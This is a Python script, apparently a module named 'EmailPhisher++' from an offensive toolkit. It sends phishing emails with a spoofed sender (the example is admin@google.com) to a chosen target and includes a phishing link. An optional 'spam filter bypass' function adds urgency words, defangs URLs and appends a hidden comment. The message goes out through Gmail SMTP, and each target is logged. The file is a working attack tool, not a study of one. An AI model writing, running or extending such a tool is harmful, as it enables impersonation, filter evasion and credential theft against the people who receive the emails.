import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import sys, os

# 🔧 Add project root to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))
from core.logger import log_event
import random

def bypass_spam_filters(subject, body):
    subject += " " + random.choice(["Update", "Notice", "Important", "Secure"])
    body = body.replace("http://", "hxxp://").replace("https://", "hxxps://")
    body += "\n<!-- hidden -->"
    return subject, body

def send_email():
    sender = input("Fake From Email (e.g. admin@google.com): ")
    to = input("Target Email: ")
    subject = input("Subject: ")
    body = input("Message Body (or phishing link): ")


    use_bypass = input("Enable Spam Filter Bypass? (y/n): ").lower()
    if use_bypass == "y":
        subject, body = bypass_spam_filters(subject, body)

    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = to
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        your_real_email = input("Your Real Gmail: ")
        your_password = input("App Password (not real password!): ")
        server.login(your_real_email, your_password)
        server.sendmail(sender, to, msg.as_string())
        server.quit()
        print("[+] Email Sent Successfully")

        # ✅ Log the event
        log_event({
            "module": "EmailPhisher++",
            "event": "Phishing email sent",
            "target_email": to,
            "from": sender,
            "subject": subject
        })

    except Exception as e:
        print("[-] Error:", e)

